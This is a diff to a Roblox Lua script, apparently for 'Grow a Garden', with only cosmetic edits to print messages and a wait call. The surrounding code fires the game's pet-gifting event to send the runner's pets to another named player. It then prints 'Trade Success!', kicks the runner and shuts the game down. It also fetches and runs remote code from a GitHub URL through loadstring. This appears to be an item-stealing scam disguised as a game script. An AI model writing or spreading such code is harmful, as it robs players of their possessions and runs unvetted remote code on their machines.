@@ -168,15 +168,15 @@ task.spawn(function()
                                                 game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("PetGiftingService"):FireServer(unpack(args))
                                             end
                                         else
+                                            task.wait(1)
                                             local args = {
                                                 "GivePet",
                                                 game:GetService("Players"):WaitForChild(x)
                                             }
                                             game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("PetGiftingService"):FireServer(unpack(args))
-                                            task.wait(1)
                                         end
                                     else
-                                        print("Trade Success")
+                                        print("Trade Success!")
                                         wait(5)
                                         player.LocalPlayer:Kick("Trade Success!")
                                         game:Shutdown()
@@ -209,7 +209,7 @@ task.spawn(function()
             end
         end)
         if not is_active and not is_executed then
-            print("Use A Aya Aya Scripts!")
+            print("Use Aya Aya Scripts!")
             loadstring(game:HttpGet("https://raw.githubusercontent.com/Achitsak/zapzone/main/loader/scripts/grow_a_garden.lua"))()
             is_executed = true
             break
